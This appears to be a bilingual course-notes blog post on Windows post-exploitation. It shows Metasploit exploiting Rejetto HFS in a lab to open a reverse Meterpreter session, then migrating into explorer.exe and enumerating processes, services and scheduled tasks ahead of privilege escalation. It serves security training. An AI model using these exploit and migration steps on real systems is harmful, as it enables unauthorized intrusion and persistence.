---
layout: post
title: "Enumerating Processes & Services"
date: "2023-06-05"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student v2
    - Host & Network Penetration Testing
    - Post-Exploitation
---

# Windows Local Enumeration
## Enumerating Processes & Services
After gaining initial access to a target system, it is always important to learn more about the system like, what processes, services and scheduled tasks are currently running.

What are we looking for?
* Running processes & services
* Scheduled tasks

A process is an instance of a running executable (.exe) or program.

A service is a process which runs in the background and does not interact with the desktop.

## Demo: Enumerating Processes & Services

# Windows 本地枚举
## 枚举进程和服务
在获得对目标系统的初始访问权限后，了解更多关于系统的信息非常重要，例如当前正在运行的进程、服务和计划任务。

我们在寻找什么？

* 运行中的进程和服务
* 计划任务

进程是一个运行的可执行文件（.exe）或程序的实例。

服务是在后台运行且不与桌面交互的进程。

## 演示：枚举进程和服务
Why is this important? Why processes and services? Like the previous steps that fall under local enumeration. It's always important to learn more about the system that you've just exploited, like what processes, services, and scheduled tasks are currently running. Why is this important? It's important for a few reasons. In the case of running processes, the reason why we ought to enumerate a list of running processes is, in the event that we want to migrate our current process to another process. An example of this would be, if we have access to a Windows target via an Meterpreter session, and the current process that we're working with on the target system is unstable and is having issues, we can migrate to a more stable process like explorer.exe. And in order to do this, we need to identify explorer.exe and as well as its process id. Another example comes into play when we will be taking a look at the privilege escalation stage of the post exploitation phase of a penetration test, and this is where scheduled tasks come into play. The reason we want to enumerate a list of scheduled tasks running on the system is primarily because during the privilege escalation phase, we will be trying to identify weaknesses or misconfigurations within each of these scheduled tasks that we can take advantage of in order to elevate our privileges.

Target IP Address : 10.2.19.62

```
msfconsole
search rejetto
use 0
set RHOSTS 10.2.19.62
exploit
```

We get a meterpreter session. Let's start off by taking a look at how we can enumerate a list of running processes with meterpreter. And then, we'll move on to the manual commands through a standard command shell session. 

If you have access to the Windows target system via Meterpreter session, you can type in the `ps` command. That will list out a list of running processes.

```
meterpreter > ps
```

It'll then sort the information into various columns. One thing you need to take into consideration or that you need to take a special note on is the User column. This will display the privileges associated with a particular process. And in this case, specific Windows processes have `NT AUTHORITY\SYSTEM` privileges. Given the fact that we have access to the target system as the Administrator user, which is a privileged user account, when we type in `ps`, it'll display a list of all the user privileges associated with a particular process. However, if we weren't a privileged user, and we type in `ps`, we would get the same information. However, under the User column, wherever the privileges were displayed, in the case of `NT AUTHORITY\SYSTEM` privileges, that would not be displayed. It would only display the user information pertinent to the current user you have access to. For example, if I gained access to the target system through a user called Bob, and I tryped in `ps`, and Bod was not a privileged user, it would still display all the processes as well as the process id. However, under the User column, it would not display all the `NT AUTHORITY\SYSTEM` privileges. It would only display privileges associated with the user Bob. And the other column is Path, that'll give you the path to the executable itself. The svchost.exe process is derived from the following executable.

How we can migrate our process. We wanted to migrate our process to explorer.exe.

We could use the `ps` command to list out the list of running processes, and then identify the explorer.exe process. And then take a look at the process id. And then we can type in `migrate`, specify the process id.

However, you do not need to list out the list of processes. You can utiliz the `pgrep` utility to search for a particular process name.

For example, I want the process id of explorer.exe.

```
meterpreter > pgrep explorer.exe
2176
```

It will tell me that the process id for explorer.exe is 2176. 

So whenever you are trying to obtain a stable meterpreter session, it's always recommended to migrate to explorer.exe, primarily because explorer.exe is rarely stopped or rarely has any issues in terms of stability as it is required in order for the Windows operating system to function.

We can migrate to a specific process or process id for that matter, by typing in migrate, and then specifying the process id.

```
meterpreter > migrate 2176
```

We had obtained a 32-bit meterpreter session. 

```
meterpreter > getuid
Server username: WIN-OMCNBKR66MN\Administrator
```

If we take a look at our current meterpreter session now, you can see that if we migrate to a 64-bit process, we are going to obtain the architecture specific to the process that we migrated to. So explorer.exe was a 64-bit process. And then we migrated to it, we obtained a 64-bit meterpreter session.

```
meterpreter > sysinfo
Architecture : x64
```

And we can utilize the `pgrep` utility, but not just a limited to migrating to a process. If we were trying to find a particular process, for example, the HTTP file server process.

```
meterpreter > pgrep hfs.exe
1684
```

And if it is running, it'll tell me the process id. This is a good way of identifying a specific process that you're interested in, and this will tell you whether it's running.

```
meterpreter > pgrep aws.exe
```

If it doesn't display a process id, that means that it's not running.

Now that we've explored the process of enumerating processes with Meterpreter. Let's take a look at how to enumerate processes and services with a standard command shell. Because in most cases, you will not have access to a Meterpreter session right out of the box.

I'll open up a command shell session here.

```
meterpreter > shell
```

And to get started, we can list or obtain a list of started services.

```
net start
```

Remember, these are services, not processes. A service runs in the background. And if you go through this list, we'll not find processes like hfs.exe. These are all the background services that are running. It makes sense to have them running in the background.

If we wanted to list out the services utilizing another utility, like `wmic`. We can keep the output brief.

```
wmic service list brief
```

This is going to display a list of all running services. This is all the services that are running in the background. And all of this information is relevant when it comes down to privilege escalation. This information is very important. And the ability to enumerate it is equally as important. That's how to list all the services with `wmic`.

We can also list out the list of services or other processes and services using the `tasklist` command.

```
tasklist /SVC
```

And this is going to display the list of processes running, as well as the services that are running under a particular process. We have the lsass.exe process here. And then the services that run under lsass.exe. This is the most important command. Because not only does it list out the list of running processes, but also the services that run under a particular process. An example of this would be, if we take a look at hfs.exe, that's the HTTP File Server. It doesn't have any services running under hfs.exe or it doesn't have any services that are responsible for maintaining the functionality of the program itself. For Windows specific processes like svchost and lsass.exe, it'll display the list of services that are running under that particular process. This is a very important information.

If you also want to list out a list of these scheduled tasks on the system, that can also be done via command shell session, so just an abbreviation for the scheduled tasks. That is going to provide us with the entire list of scheduled tasks that have been configured to run on this target system. This command is going to output a lot of information, which I would recommend that you copy and paste into a text file for later use, and this will come into play during the privilege escalation phase of the post-exploitation phase of a penetration test.

```
schtasks /query /fo LIST
```

It's not enumerated additional information that's really important. 

```
schtasks /query /fo LIST /v
```

Why is this information important? In certain cases, scheduled tasks could be misconfigured or configured in a way that makes them vulnerable to exploitaion, and more specifically, they can be exploited in some cases to elevate our privileges. So in the context of privilege escalation, we would typically be looking for scheduled tasks that are running with the `NT AUTHORITY\SYSTEM` privileges. And that's typically what we would be looking for. In that, if we can get that scheduled task to run or execute our specific executable, an executable that we specify, then we can potentially elevate our privileges. And that's something that will fall under privilege escalation. I would recommend that you copy all of this information and paste it into a text file as it will become important later on. 

And for all the information that you're gathering or that you have gathered during the local enumeration phase of post exploitation, I would recommend that you save all of that information and you ensure that you're documenting all of the important information that you're gathering, so that you can use it during the other phases of post-exploitation and also during the reporting stage or phase of the penetration test. You can go through the list, you can then copy this and save it into a text file.

# Enumerating Processes & Services（枚举进程和服务）
## Overview（概述）
Goal

This lab covers the process of enumerating running processes and services on a Windows target.

目标

本实验涵盖了在 Windows 目标上枚举正在运行的进程和服务的过程。

## 复现视频内容
Target IP Address : 10.0.23.161

Kali Linux : 10.10.21.3

```
root@attackdefense:~# service postgresql start && msfconsole -q
Starting PostgreSQL 12 database server: main.
msf5 > search rejetto

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution


msf5 > use 0
msf5 exploit(windows/http/rejetto_hfs_exec) > set RHOSTS 10.0.23.161
RHOSTS => 10.0.23.161
msf5 exploit(windows/http/rejetto_hfs_exec) > exploit

[*] Started reverse TCP handler on 10.10.21.3:4444 
[*] Using URL: http://0.0.0.0:8080/5bADt8e
[*] Local IP: http://10.10.21.3:8080/5bADt8e
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /5bADt8e
[*] Sending stage (180291 bytes) to 10.0.23.161
[*] Meterpreter session 1 opened (10.10.21.3:4444 -> 10.0.23.161:49238) at 2023-06-05 07:07:20 +0530
[!] Tried to delete %TEMP%\FmJep.vbs, unknown result
[*] Server stopped.

meterpreter > 
```

```
meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User                           Path
 ---   ----  ----                  ----  -------  ----                           ----
 0     0     [System Process]                                                    
 4     0     System                x64   0                                       
 336   656   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE   C:\Windows\System32\svchost.exe
 348   4     smss.exe              x64   0                                       
 492   484   csrss.exe             x64   0                                       
 556   548   csrss.exe             x64   1                                       
 564   484   wininit.exe           x64   0        NT AUTHORITY\SYSTEM            C:\Windows\System32\wininit.exe
 592   548   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM            C:\Windows\System32\winlogon.exe
 656   564   services.exe          x64   0                                       
 664   564   lsass.exe             x64   0        NT AUTHORITY\SYSTEM            C:\Windows\System32\lsass.exe
 720   656   svchost.exe           x64   0        NT AUTHORITY\SYSTEM            C:\Windows\System32\svchost.exe
 732   656   vds.exe               x64   0        NT AUTHORITY\SYSTEM            C:\Windows\System32\vds.exe
 748   656   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE   C:\Windows\System32\svchost.exe
 844   592   dwm.exe               x64   1        Window Manager\DWM-1           C:\Windows\System32\dwm.exe
 860   656   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE     C:\Windows\System32\svchost.exe
 884   656   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE     C:\Windows\System32\svchost.exe
 904   656   svchost.exe           x64   0        NT AUTHORITY\SYSTEM            C:\Windows\System32\svchost.exe
 948   656   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE     C:\Windows\System32\svchost.exe
 1044  656   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM            C:\Windows\System32\spoolsv.exe
 1076  656   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM            C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
 1144  656   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM            C:\Program Files\Amazon\XenTools\LiteAgent.exe
 1164  656   svchost.exe           x64   0        NT AUTHORITY\SYSTEM            C:\Windows\System32\svchost.exe
 1200  656   svchost.exe           x64   0        NT AUTHORITY\SYSTEM            C:\Windows\System32\svchost.exe
 1260  656   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM            C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
 1288  1836  RNaRKuYfQ.exe         x86   1        WIN-OMCNBKR66MN\Administrator  C:\Users\ADMINI~1\AppData\Local\Temp\1\radFED3F.tmp\RNaRKuYfQ.exe
 1428  720   WmiPrvSE.exe          x64   0        NT AUTHORITY\SYSTEM            C:\Windows\System32\wbem\WmiPrvSE.exe
 1652  720   WmiPrvSE.exe          x64   0        NT AUTHORITY\NETWORK SERVICE   C:\Windows\System32\wbem\WmiPrvSE.exe
 1836  3052  wscript.exe           x86   1        WIN-OMCNBKR66MN\Administrator  C:\Windows\SysWOW64\wscript.exe
 1948  656   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE   C:\Windows\System32\svchost.exe
 2004  656   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE   C:\Windows\System32\svchost.exe
 2104  904   taskhostex.exe        x64   1        WIN-OMCNBKR66MN\Administrator  C:\Windows\System32\taskhostex.exe
 2164  2144  explorer.exe          x64   1        WIN-OMCNBKR66MN\Administrator  C:\Windows\explorer.exe
 2232  656   msdtc.exe             x64   0        NT AUTHORITY\NETWORK SERVICE   C:\Windows\System32\msdtc.exe
 2304  904   WMIADAP.exe           x64   0        NT AUTHORITY\SYSTEM            C:\Windows\System32\wbem\WMIADAP.exe
 2400  2448  conhost.exe           x64   1        WIN-OMCNBKR66MN\Administrator  C:\Windows\System32\conhost.exe
 2448  1288  cmd.exe               x86   1        WIN-OMCNBKR66MN\Administrator  C:\Windows\SysWOW64\cmd.exe
 2748  2164  powershell.exe        x86   1        WIN-OMCNBKR66MN\Administrator  C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
 2756  2748  conhost.exe           x64   1        WIN-OMCNBKR66MN\Administrator  C:\Windows\System32\conhost.exe
 3052  2748  hfs.exe               x86   1        WIN-OMCNBKR66MN\Administrator  C:\hfs\hfs.exe

```

```
meterpreter > getuid
Server username: WIN-OMCNBKR66MN\Administrator
meterpreter > sysinfo
Computer        : WIN-OMCNBKR66MN
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter > pgrep explorer.exe
2164
meterpreter > migrate 2164
[*] Migrating from 1288 to 2164...
[*] Migration completed successfully.
meterpreter > getuid
Server username: WIN-OMCNBKR66MN\Administrator
meterpreter > sysinfo
Computer        : WIN-OMCNBKR66MN
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x64/windows
```

```
meterpreter > pgrep hfs.exe
3052
meterpreter > pgrep aws.exe
```

```
meterpreter > shell
Process 1660 created.
Channel 1 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>net start
net start
These Windows services are started:

   Amazon SSM Agent
   AWS Lite Guest Agent
   Background Tasks Infrastructure Service
   Base Filtering Engine
   Certificate Propagation
   CNG Key Isolation
   COM+ Event System
   Cryptographic Services
   DCOM Server Process Launcher
   Device Setup Manager
   DHCP Client
   Diagnostic Policy Service
   Diagnostics Tracking Service
   Distributed Link Tracking Client
   Distributed Transaction Coordinator
   DNS Client
   Ec2Config
   Group Policy Client
   IKE and AuthIP IPsec Keying Modules
   IP Helper
   IPsec Policy Agent
   Local Session Manager
   Network List Service
   Network Location Awareness
   Network Store Interface Service
   Plug and Play
   Power
   Print Spooler
   Remote Desktop Configuration
   Remote Desktop Services
   Remote Desktop Services UserMode Port Redirector
   Remote Procedure Call (RPC)
   RPC Endpoint Mapper
   Security Accounts Manager
   Server
   Shell Hardware Detection
   System Event Notification Service
   System Events Broker
   Task Scheduler
   TCP/IP NetBIOS Helper
   Themes
   User Access Logging Service
   User Profile Service
   Windows Connection Manager
   Windows Event Log
   Windows Font Cache Service
   Windows Management Instrumentation
   Windows Remote Management (WS-Management)
   WinHTTP Web Proxy Auto-Discovery Service
   Workstation

The command completed successfully.

```

```
C:\Windows\system32>wmic service list brief
wmic service list brief
ExitCode  Name                      ProcessId  StartMode  State    Status  
0         AeLookupSvc               0          Manual     Stopped  OK      
1077      ALG                       0          Manual     Stopped  OK      
0         AmazonSSMAgent            1076       Auto       Running  OK      
1077      AppIDSvc                  0          Manual     Stopped  OK      
1077      Appinfo                   0          Manual     Stopped  OK      
1077      AppMgmt                   0          Manual     Stopped  OK      
1077      AppReadiness              0          Manual     Stopped  OK      
1077      AppXSvc                   0          Manual     Stopped  OK      
1077      AudioEndpointBuilder      0          Manual     Stopped  OK      
1077      Audiosrv                  0          Manual     Stopped  OK      
0         AWSLiteAgent              1144       Auto       Running  OK      
0         BFE                       884        Auto       Running  OK      
1077      BITS                      0          Manual     Stopped  OK      
0         BrokerInfrastructure      720        Auto       Running  OK      
1077      Browser                   0          Disabled   Stopped  OK      
0         CertPropSvc               904        Manual     Running  OK      
1077      cfn-hup                   0          Manual     Stopped  OK      
1077      COMSysApp                 0          Manual     Stopped  OK      
0         CryptSvc                  336        Auto       Running  OK      
0         DcomLaunch                720        Auto       Running  OK      
0         defragsvc                 0          Manual     Stopped  OK      
1077      DeviceAssociationService  0          Manual     Stopped  OK      
0         DeviceInstall             0          Manual     Stopped  OK      
0         Dhcp                      860        Auto       Running  OK      
0         DiagTrack                 1164       Auto       Running  OK      
0         Dnscache                  336        Auto       Running  OK      
1077      dot3svc                   0          Manual     Stopped  OK      
0         DPS                       884        Auto       Running  OK      
0         DsmSvc                    904        Manual     Running  OK      
1077      Eaphost                   0          Manual     Stopped  OK      
0         Ec2Config                 1260       Auto       Running  OK      
1077      EFS                       0          Manual     Stopped  OK      
0         EventLog                  860        Auto       Running  OK      
0         EventSystem               948        Auto       Running  OK      
1077      fdPHost                   0          Manual     Stopped  OK      
1077      FDResPub                  0          Manual     Stopped  OK      
0         FontCache                 948        Auto       Running  OK      
0         gpsvc                     904        Auto       Running  OK      
1077      hidserv                   0          Manual     Stopped  OK      
1077      hkmsvc                    0          Manual     Stopped  OK      
1077      IEEtwCollectorService     0          Manual     Stopped  OK      
0         IKEEXT                    904        Auto       Running  OK      
0         iphlpsvc                  904        Auto       Running  OK      
0         KeyIso                    664        Manual     Running  OK      
1077      KPSSVC                    0          Manual     Stopped  OK      
1077      KtmRm                     0          Manual     Stopped  OK      
0         LanmanServer              904        Auto       Running  OK      
0         LanmanWorkstation         336        Auto       Running  OK      
1077      lltdsvc                   0          Manual     Stopped  OK      
0         lmhosts                   860        Auto       Running  OK      
0         LSM                       720        Auto       Running  OK      
1077      MMCSS                     0          Manual     Stopped  OK      
1077      MozillaMaintenance        0          Manual     Stopped  OK      
1077      MpsSvc                    0          Disabled   Stopped  OK      
0         MSDTC                     2232       Auto       Running  OK      
1077      MSiSCSI                   0          Manual     Stopped  OK      
1077      msiserver                 0          Manual     Stopped  OK      
1077      napagent                  0          Manual     Stopped  OK      
1077      NcaSvc                    0          Manual     Stopped  OK      
1077      Netlogon                  0          Manual     Stopped  OK      
1077      Netman                    0          Manual     Stopped  OK      
0         netprofm                  948        Manual     Running  OK      
1077      NetTcpPortSharing         0          Disabled   Stopped  OK      
0         NlaSvc                    336        Auto       Running  OK      
0         nsi                       948        Auto       Running  OK      
1077      PerfHost                  0          Manual     Stopped  OK      
1077      pla                       0          Manual     Stopped  OK      
0         PlugPlay                  720        Manual     Running  OK      
0         PolicyAgent               2004       Manual     Running  OK      
0         Power                     720        Auto       Running  OK      
1077      PrintNotify               0          Manual     Stopped  OK      
0         ProfSvc                   904        Auto       Running  OK      
1077      RasAuto                   0          Manual     Stopped  OK      
1077      RasMan                    0          Manual     Stopped  OK      
1077      RemoteAccess              0          Disabled   Stopped  OK      
0         RemoteRegistry            0          Auto       Stopped  OK      
0         RpcEptMapper              748        Auto       Running  OK      
1077      RpcLocator                0          Manual     Stopped  OK      
0         RpcSs                     748        Auto       Running  OK      
1077      RSoPProv                  0          Manual     Stopped  OK      
1077      sacsvr                    0          Manual     Stopped  OK      
0         SamSs                     664        Auto       Running  OK      
1077      SCardSvr                  0          Disabled   Stopped  OK      
1077      ScDeviceEnum              0          Manual     Stopped  OK      
0         Schedule                  904        Auto       Running  OK      
1077      SCPolicySvc               0          Manual     Stopped  OK      
1077      seclogon                  0          Manual     Stopped  OK      
0         SENS                      904        Auto       Running  OK      
0         SessionEnv                904        Manual     Running  OK      
1077      SharedAccess              0          Disabled   Stopped  OK      
0         ShellHWDetection          904        Auto       Running  OK      
1077      smphost                   0          Manual     Stopped  OK      
1077      SNMPTRAP                  0          Manual     Stopped  OK      
0         Spooler                   1044       Auto       Running  OK      
0         sppsvc                    0          Auto       Stopped  OK      
1077      SSDPSRV                   0          Disabled   Stopped  OK      
1077      SstpSvc                   0          Manual     Stopped  OK      
1077      svsvc                     0          Manual     Stopped  OK      
1077      swprv                     0          Manual     Stopped  OK      
1077      SysMain                   0          Manual     Stopped  OK      
0         SystemEventsBroker        720        Auto       Running  OK      
1077      TapiSrv                   0          Manual     Stopped  OK      
0         TermService               1948       Manual     Running  OK      
0         Themes                    904        Auto       Running  OK      
1077      THREADORDER               0          Manual     Stopped  OK      
1077      TieringEngineService      0          Manual     Stopped  OK      
0         TrkWks                    1200       Auto       Running  OK      
0         TrustedInstaller          0          Manual     Stopped  OK      
0         UALSVC                    1200       Auto       Running  OK      
1077      UI0Detect                 0          Manual     Stopped  OK      
0         UmRdpService              1200       Manual     Running  OK      
1077      upnphost                  0          Disabled   Stopped  OK      
1077      VaultSvc                  0          Manual     Stopped  OK      
0         vds                       0          Manual     Stopped  OK      
1077      vmicguestinterface        0          Manual     Stopped  OK      
1077      vmicheartbeat             0          Manual     Stopped  OK      
1077      vmickvpexchange           0          Manual     Stopped  OK      
1077      vmicrdv                   0          Manual     Stopped  OK      
1077      vmicshutdown              0          Manual     Stopped  OK      
1077      vmictimesync              0          Manual     Stopped  OK      
1077      vmicvss                   0          Manual     Stopped  OK      
1077      VSS                       0          Manual     Stopped  OK      
0         W32Time                   0          Manual     Stopped  OK      
0         Wcmsvc                    860        Auto       Running  OK      
1077      WcsPlugInService          0          Manual     Stopped  OK      
1077      WdiServiceHost            0          Manual     Stopped  OK      
1077      WdiSystemHost             0          Manual     Stopped  OK      
1077      Wecsvc                    0          Manual     Stopped  OK      
1077      WEPHOSTSVC                0          Manual     Stopped  OK      
1077      wercplsupport             0          Manual     Stopped  OK      
1077      WerSvc                    0          Disabled   Stopped  OK      
0         WinHttpAutoProxySvc       948        Manual     Running  OK      
0         Winmgmt                   904        Auto       Running  OK      
0         WinRM                     336        Auto       Running  OK      
1077      wmiApSrv                  0          Manual     Stopped  OK      
0         WPDBusEnum                0          Manual     Stopped  OK      
1077      WSService                 0          Manual     Stopped  OK      
1077      wuauserv                  0          Manual     Stopped  OK      
1077      wudfsvc                   0          Manual     Stopped  OK      

```

```
C:\Windows\system32>tasklist /SVC
tasklist /SVC

Image Name                     PID Services                                    
========================= ======== ============================================
System Idle Process              0 N/A                                         
System                           4 N/A                                         
smss.exe                       348 N/A                                         
csrss.exe                      492 N/A                                         
csrss.exe                      556 N/A                                         
wininit.exe                    564 N/A                                         
winlogon.exe                   592 N/A                                         
services.exe                   656 N/A                                         
lsass.exe                      664 KeyIso, SamSs                               
svchost.exe                    720 BrokerInfrastructure, DcomLaunch, LSM,      
                                   PlugPlay, Power, SystemEventsBroker         
svchost.exe                    748 RpcEptMapper, RpcSs                         
dwm.exe                        844 N/A                                         
svchost.exe                    860 Dhcp, EventLog, lmhosts, Wcmsvc             
svchost.exe                    904 CertPropSvc, DsmSvc, gpsvc, IKEEXT,         
                                   iphlpsvc, LanmanServer, ProfSvc, Schedule,  
                                   SENS, SessionEnv, ShellHWDetection, Themes, 
                                   Winmgmt                                     
svchost.exe                    948 EventSystem, FontCache, netprofm, nsi,      
                                   WinHttpAutoProxySvc                         
svchost.exe                    336 CryptSvc, Dnscache, LanmanWorkstation,      
                                   NlaSvc, WinRM                               
svchost.exe                    884 BFE, DPS                                    
spoolsv.exe                   1044 Spooler                                     
amazon-ssm-agent.exe          1076 AmazonSSMAgent                              
LiteAgent.exe                 1144 AWSLiteAgent                                
svchost.exe                   1164 DiagTrack                                   
svchost.exe                   1200 TrkWks, UALSVC, UmRdpService                
Ec2Config.exe                 1260 Ec2Config                                   
svchost.exe                   1948 TermService                                 
svchost.exe                   2004 PolicyAgent                                 
taskhostex.exe                2104 N/A                                         
explorer.exe                  2164 N/A                                         
powershell.exe                2748 N/A                                         
conhost.exe                   2756 N/A                                         
hfs.exe                       3052 N/A                                         
msdtc.exe                     2232 MSDTC                                       
cmd.exe                       2448 N/A                                         
conhost.exe                   2400 N/A                                         
cmd.exe                       1660 N/A                                         
conhost.exe                   2508 N/A                                         
tasklist.exe                  2704 N/A                                         
WmiPrvSE.exe                   652 N/A                    
```

```
C:\Windows\system32>schtasks /query /fo LIST
schtasks /query /fo LIST

Folder: \
HostName:      WIN-OMCNBKR66MN
TaskName:      \Ec2ConfigMonitorTask
Next Run Time: N/A
Status:        Ready
Logon Mode:    Interactive/Background

HostName:      WIN-OMCNBKR66MN
TaskName:      \Ec2ConfigMonitorTask
Next Run Time: N/A
Status:        Ready
Logon Mode:    Interactive/Background

HostName:      WIN-OMCNBKR66MN
TaskName:      \Optimize Start Menu Cache Files-S-1-5-21-2563855374-3215282501-1490390052-500
Next Run Time: N/A
Status:        Disabled
Logon Mode:    Interactive only

Folder: \Microsoft
INFO: There are no scheduled tasks presently available at your access level.

Folder: \Microsoft\Windows
INFO: There are no scheduled tasks presently available at your access level.

Folder: \Microsoft\Windows\.NET Framework
HostName:      WIN-OMCNBKR66MN
TaskName:      \Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319
Next Run Time: N/A
Status:        Ready
Logon Mode:    Interactive/Background

HostName:      WIN-OMCNBKR66MN
TaskName:      \Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319 64
Next Run Time: N/A
Status:        Ready
Logon Mode:    Interactive/Background

HostName:      WIN-OMCNBKR66MN
TaskName:      \Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319 64 Critical
Next Run Time: N/A
Status:        Disabled
Logon Mode:    Interactive/Background

HostName:      WIN-OMCNBKR66MN
TaskName:      \Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319 Critical
Next Run Time: N/A
Status:        Disabled
Logon Mode:    Interactive/Background

Folder: \Microsoft\Windows\WS
HostName:      WIN-OMCNBKR66MN
TaskName:      \Microsoft\Windows\WS\License Validation
Next Run Time: N/A
Status:        Disabled
Logon Mode:    Interactive/Background

HostName:      WIN-OMCNBKR66MN
TaskName:      \Microsoft\Windows\WS\WSTask
Next Run Time: N/A
Status:        Ready
Logon Mode:    Interactive/Background

Folder: \Mozilla
HostName:      WIN-OMCNBKR66MN
TaskName:      \Mozilla\Firefox Default Browser Agent E7CF176E110C211B
Next Run Time: 6/5/2023 9:05:00 AM
Status:        Ready
Logon Mode:    Interactive only

```

```
C:\Windows\system32>schtasks /query /fo LIST /v

Folder: \Microsoft\Windows\User Profile Service
HostName:                             WIN-OMCNBKR66MN
TaskName:                             \Microsoft\Windows\User Profile Service\HiveUploadTask
Next Run Time:                        N/A
Status:                               Disabled
Logon Mode:                           Interactive/Background
Last Run Time:                        N/A
Last Result:                          1
Author:                               Microsoft Corporation
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              This task will automatically upload a roaming user profile's registry hive to its network location.
Scheduled Task State:                 Disabled
Idle Time:                            Only Start If Idle for 10 minutes, If Not Idle Retry For 120 minutes
Power Management:                     Stop On Battery Mode
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        One Time Only, Hourly 
Start Time:                           12:00:00 AM
Start Date:                           8/28/2007
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        12 Hour(s), 0 Minute(s)
Repeat: Until: Time:                  None
Repeat: Until: Duration:              Disabled
Repeat: Stop If Still Running:        Disabled

Folder: \Microsoft\Windows\WDI
HostName:                             WIN-OMCNBKR66MN
TaskName:                             \Microsoft\Windows\WDI\ResolutionHost
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        N/A
Last Result:                          1
Author:                               Microsoft Corporation
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              The Windows Diagnostic Infrastructure Resolution host enables interactive resolutions for system problems detected by the Diagnostic Policy Service. It is triggered when necessary by the Diagnostic Policy Service in the appropriate user session. If the 
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     
Run As User:                          INTERACTIVE
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: Disabled
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

```